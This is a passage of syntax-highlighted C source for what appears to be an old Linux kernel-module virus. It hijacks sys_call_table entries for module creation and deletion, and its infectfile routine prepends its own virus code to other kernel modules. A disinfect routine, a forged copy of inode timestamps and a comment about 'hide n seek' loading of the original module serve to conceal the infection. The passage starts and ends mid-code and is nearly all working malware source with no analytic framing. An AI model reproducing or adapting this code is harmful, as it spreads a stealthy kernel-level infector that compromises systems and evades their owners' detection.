                </span><span class="sc11">old_create_module</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">sys_call_table</span><span class="sc10">[</span><span class="sc11">__NR_create_module</span><span class="sc10">];</span><span class="sc0">
                </span><span class="sc11">sys_call_table</span><span class="sc10">[</span><span class="sc11">__NR_our_syscall</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">*)</span><span class="sc11">our_syscall</span><span class="sc10">;</span><span class="sc0">          
                </span><span class="sc11">sys_call_table</span><span class="sc10">[</span><span class="sc11">__NR_delete_module</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">*)</span><span class="sc11">new_delete_module</span><span class="sc10">;</span><span class="sc0">         
                </span><span class="sc11">sys_call_table</span><span class="sc10">[</span><span class="sc11">__NR_create_module</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">*)</span><span class="sc11">new_create_module</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">memset</span><span class="sc10">(</span><span class="sc11">files2infect</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">60</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">)*</span><span class="sc4">7</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">register_symtab</span><span class="sc10">(&amp;</span><span class="sc11">my_symtab</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc11">register_symtab</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">open</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">sys_call_table</span><span class="sc10">[</span><span class="sc11">__NR_open</span><span class="sc10">];</span><span class="sc0"> 
        </span><span class="sc11">close</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">sys_call_table</span><span class="sc10">[</span><span class="sc11">__NR_close</span><span class="sc10">];</span><span class="sc0">        
        </span><span class="sc11">unlink</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">sys_call_table</span><span class="sc10">[</span><span class="sc11">__NR_unlink</span><span class="sc10">];</span><span class="sc0">        
        
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">s</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">get_mod_name</span><span class="sc10">(</span><span class="sc11">mod</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">modname</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">modname</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">load_real_mod</span><span class="sc10">(</span><span class="sc11">modname</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">mod</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">vfree</span><span class="sc10">(</span><span class="sc11">mod</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">vfree</span><span class="sc10">(</span><span class="sc11">modname</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">        

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">cleanup_module</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">sys_call_table</span><span class="sc10">[</span><span class="sc11">__NR_delete_module</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">old_delete_module</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">sys_call_table</span><span class="sc10">[</span><span class="sc11">__NR_create_module</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">old_create_module</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">sys_call_table</span><span class="sc10">[</span><span class="sc11">__NR_our_syscall</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">DPRINTK</span><span class="sc10">(</span><span class="sc6">"in cleanup_module\n"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">vfree</span><span class="sc10">(</span><span class="sc11">VirCode</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* returns 1 if infected; 
 * seek at position MODLEN + 1 and read out 3 bytes,
 * if it is "ELF" it seems the file is already infected
 */</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">is_infected</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">filename</span><span class="sc10">)</span><span class="sc0"> 
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">det</span><span class="sc10">[</span><span class="sc4">4</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc4">0</span><span class="sc10">};</span><span class="sc0">
        </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">file</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">file</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc11">DPRINTK</span><span class="sc10">(</span><span class="sc6">"in is_infected: filename = %s\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">filename</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">BEGIN_KMEM</span><span class="sc0">
        </span><span class="sc11">fd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">open</span><span class="sc10">(</span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">O_RDONLY</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0"> 
        </span><span class="sc11">END_KMEM</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">file</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">current</span><span class="sc10">-&gt;</span><span class="sc11">files</span><span class="sc10">-&gt;</span><span class="sc11">fd</span><span class="sc10">[</span><span class="sc11">fd</span><span class="sc10">])</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">f_pos</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">MODLEN</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">DPRINTK</span><span class="sc10">(</span><span class="sc6">"in is_infected: file-&gt;f_pos = %d\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">f_pos</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">BEGIN_KMEM</span><span class="sc0">
        </span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">f_op</span><span class="sc10">-&gt;</span><span class="sc11">read</span><span class="sc10">(</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">f_inode</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">file</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">det</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">END_KMEM</span><span class="sc0">
        </span><span class="sc11">DPRINTK</span><span class="sc10">(</span><span class="sc6">"in is_infected: det = %s\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">det</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">strcmp</span><span class="sc10">(</span><span class="sc11">det</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ELF"</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">else</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* copy the host-module to tmp, write VirCode to
 * hostmodule, and append tmp.
 * then delete tmp.
 */</span><span class="sc0">


</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">infectfile</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">filename</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">tmp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"/tmp/t000"</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">in</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">out</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">file</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">file1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">file2</span><span class="sc10">;</span><span class="sc0">
        
        </span><span class="sc11">BEGIN_KMEM</span><span class="sc0">
        </span><span class="sc11">in</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">open</span><span class="sc10">(</span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">O_RDONLY</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0640</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">out</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">open</span><span class="sc10">(</span><span class="sc11">tmp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">O_RDWR</span><span class="sc10">|</span><span class="sc11">O_TRUNC</span><span class="sc10">|</span><span class="sc11">O_CREAT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0640</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">END_KMEM</span><span class="sc0">
        </span><span class="sc11">DPRINTK</span><span class="sc10">(</span><span class="sc6">"in infectfile: in = %d out = %d\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">in</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">out</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">in</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">out</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">file1</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">current</span><span class="sc10">-&gt;</span><span class="sc11">files</span><span class="sc10">-&gt;</span><span class="sc11">fd</span><span class="sc10">[</span><span class="sc11">in</span><span class="sc10">];</span><span class="sc0">
        </span><span class="sc11">file2</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">current</span><span class="sc10">-&gt;</span><span class="sc11">files</span><span class="sc10">-&gt;</span><span class="sc11">fd</span><span class="sc10">[</span><span class="sc11">out</span><span class="sc10">];</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">file1</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">!</span><span class="sc11">file2</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc1">/* save hostcode */</span><span class="sc0">
        </span><span class="sc11">cp</span><span class="sc10">(</span><span class="sc11">file1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">file2</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">BEGIN_KMEM</span><span class="sc0">
        </span><span class="sc11">file1</span><span class="sc10">-&gt;</span><span class="sc11">f_pos</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">file2</span><span class="sc10">-&gt;</span><span class="sc11">f_pos</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc1">/* write Vircode [from mem] */</span><span class="sc0">
        </span><span class="sc11">DPRINTK</span><span class="sc10">(</span><span class="sc6">"in infetcfile: filenanme = %s\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">filename</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">file1</span><span class="sc10">-&gt;</span><span class="sc11">f_op</span><span class="sc10">-&gt;</span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">file1</span><span class="sc10">-&gt;</span><span class="sc11">f_inode</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">file1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">VirCode</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MODLEN</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc1">/* append hostcode */</span><span class="sc0">
        </span><span class="sc11">cp</span><span class="sc10">(</span><span class="sc11">file2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">file1</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">in</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">out</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">unlink</span><span class="sc10">(</span><span class="sc11">tmp</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">END_KMEM</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">        

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">disinfect</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">filename</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">

    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">tmp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"/tmp/t000"</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">in</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">out</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">file</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">file1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">file2</span><span class="sc10">;</span><span class="sc0">
        
        </span><span class="sc11">BEGIN_KMEM</span><span class="sc0">
        </span><span class="sc11">in</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">open</span><span class="sc10">(</span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">O_RDONLY</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0640</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">out</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">open</span><span class="sc10">(</span><span class="sc11">tmp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">O_RDWR</span><span class="sc10">|</span><span class="sc11">O_TRUNC</span><span class="sc10">|</span><span class="sc11">O_CREAT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0640</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">END_KMEM</span><span class="sc0">
        </span><span class="sc11">DPRINTK</span><span class="sc10">(</span><span class="sc6">"in disinfect: in = %d out = %d\n"</span><span class="sc10">,</span><span class="sc11">in</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">out</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">in</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">out</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">file1</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">current</span><span class="sc10">-&gt;</span><span class="sc11">files</span><span class="sc10">-&gt;</span><span class="sc11">fd</span><span class="sc10">[</span><span class="sc11">in</span><span class="sc10">];</span><span class="sc0">
        </span><span class="sc11">file2</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">current</span><span class="sc10">-&gt;</span><span class="sc11">files</span><span class="sc10">-&gt;</span><span class="sc11">fd</span><span class="sc10">[</span><span class="sc11">out</span><span class="sc10">];</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">file1</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">!</span><span class="sc11">file2</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc1">/* save hostcode */</span><span class="sc0">
        </span><span class="sc11">cp</span><span class="sc10">(</span><span class="sc11">file1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">file2</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">BEGIN_KMEM</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">in</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">DPRINTK</span><span class="sc10">(</span><span class="sc6">"in disinfect: filename = %s\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">filename</span><span class="sc10">);</span><span class="sc0"> 
        </span><span class="sc11">unlink</span><span class="sc10">(</span><span class="sc11">filename</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">in</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">open</span><span class="sc10">(</span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">O_RDWR</span><span class="sc10">|</span><span class="sc11">O_CREAT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0640</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">END_KMEM</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">in</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">file1</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">current</span><span class="sc10">-&gt;</span><span class="sc11">files</span><span class="sc10">-&gt;</span><span class="sc11">fd</span><span class="sc10">[</span><span class="sc11">in</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">file1</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">file2</span><span class="sc10">-&gt;</span><span class="sc11">f_pos</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">MODLEN</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">cp</span><span class="sc10">(</span><span class="sc11">file2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">file1</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">BEGIN_KMEM</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">in</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">out</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">unlink</span><span class="sc10">(</span><span class="sc11">tmp</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">END_KMEM</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* a simple copy routine, that expects the file struct pointer
 * of the files to be copied.
 * So its possible to append files due to copieng.
 */</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">cp</span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">file</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">file1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">file</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">file2</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">

    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">in</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">out</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">r</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">buf</span><span class="sc10">;</span><span class="sc0">
        
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">buf</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">*)</span><span class="sc11">vmalloc</span><span class="sc10">(</span><span class="sc4">10000</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc11">DPRINTK</span><span class="sc10">(</span><span class="sc6">"in cp: f_pos = %d\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">file1</span><span class="sc10">-&gt;</span><span class="sc11">f_pos</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">BEGIN_KMEM</span><span class="sc0">
        </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">r</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">file1</span><span class="sc10">-&gt;</span><span class="sc11">f_op</span><span class="sc10">-&gt;</span><span class="sc11">read</span><span class="sc10">(</span><span class="sc11">file1</span><span class="sc10">-&gt;</span><span class="sc11">f_inode</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">file1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">10000</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc11">file2</span><span class="sc10">-&gt;</span><span class="sc11">f_op</span><span class="sc10">-&gt;</span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">file2</span><span class="sc10">-&gt;</span><span class="sc11">f_inode</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">file2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">r</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">file2</span><span class="sc10">-&gt;</span><span class="sc11">f_inode</span><span class="sc10">-&gt;</span><span class="sc11">i_mode</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">file1</span><span class="sc10">-&gt;</span><span class="sc11">f_inode</span><span class="sc10">-&gt;</span><span class="sc11">i_mode</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">file2</span><span class="sc10">-&gt;</span><span class="sc11">f_inode</span><span class="sc10">-&gt;</span><span class="sc11">i_atime</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">file1</span><span class="sc10">-&gt;</span><span class="sc11">f_inode</span><span class="sc10">-&gt;</span><span class="sc11">i_atime</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">file2</span><span class="sc10">-&gt;</span><span class="sc11">f_inode</span><span class="sc10">-&gt;</span><span class="sc11">i_mtime</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">file1</span><span class="sc10">-&gt;</span><span class="sc11">f_inode</span><span class="sc10">-&gt;</span><span class="sc11">i_mtime</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">file2</span><span class="sc10">-&gt;</span><span class="sc11">f_inode</span><span class="sc10">-&gt;</span><span class="sc11">i_ctime</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">file1</span><span class="sc10">-&gt;</span><span class="sc11">f_inode</span><span class="sc10">-&gt;</span><span class="sc11">i_ctime</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">END_KMEM</span><span class="sc0">
        </span><span class="sc11">vfree</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* Is that simple: we disinfect the module [hide 'n seek]
 * and send a request to kerneld to load
 * the orig mod. N0 fuckin' parsing for symbols and headers
 * is needed - cool.
 */</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">load_real_mod</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">path_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">name</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">       
